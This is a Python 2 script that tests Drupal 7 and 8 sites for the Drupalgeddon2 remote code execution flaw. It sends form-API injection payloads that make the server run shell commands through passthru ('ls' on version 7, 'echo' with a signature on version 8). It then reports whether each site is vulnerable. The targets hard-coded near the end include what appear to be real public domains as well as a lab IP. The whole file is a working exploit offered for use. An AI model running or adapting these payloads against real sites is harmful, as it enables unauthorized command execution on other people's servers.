import requests
import re
import bb01_ultilities as ulti



"""
Fuction to check if the exploited form is avaiable
- RETURN:
    True: if the form can be connected 
    False: if the form can be connected
    newURL -> string: if the form is redirected to other """
def isFormValid(host, version):
    form_id = 'user/password' if version[:1] == '7' else 'user/register'
    urlq = host + '?q=' + form_id
    url = host + form_id

    redirectURL = ulti.isURLRedirected(url)
    if (redirectURL is not False):
        return redirectURL

    if(ulti.isURLRedirected(url) is not False):
        url = ulti.isURLRedirected(url)

    if (ulti.isURLValid(urlq) or ulti.isURLValid(url)):
        return True

    return False


def isPwnAble(host, version):
    signature = ulti.genSignature()
    version = version[:1]
    if version == '7':
        get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                      'name[#type]': 'markup', 'name[#markup]': ' ls '}
        post_params = {'form_id': 'user_pass',
                       '_triggering_element_name': 'name'}
        try:
            r = requests.post(host, data=post_params,
                              params=get_params, verify=False)
        except:
            return False
        m = re.search(r'<input type="hidden" name="form_build_id" \
                       value="([^"]+)"', r.text)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            res = requests.post(host, data=post_params, params=get_params)
            detect = bool(re.search(signature, res.text))
            if detect:
                return True
        else:
            return False

    if version == '8':
        url = ulti.genURLD8(host)
        post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1',
                       'mail[a][#post_render][]': 'passthru',
                       'mail[a][#type]': 'markup',
                       'mail[a][#markup]': ' echo ' + signature}
        try:
            r = requests.post(url, data=post_params, verify=False)
        except Exception as e:
            print e
            return False
        m = bool(re.search(signature, r.text))
        if m:
            return True
        else:
            return False


def isVuln(host, version):
    if isFormValid(host,version) is False:
    	return False

    if isPwnAble(host, version) is False:
        return False

    return True


host = 'http://abohn.org/'
host = 'http://192.168.210.134'
host = 'http://zestman.com/'
version = '7.44'
version = '8.2'
print 'Testing: ', host
print '=' * 25

# print isPwnAbleRedirect('x','7')
# print isPwnAble(host, version)
try:
	if isVuln(host,version):
		print " This site is vulnerable"
	else:
		print " This site is invulnerable"
except:
	pass
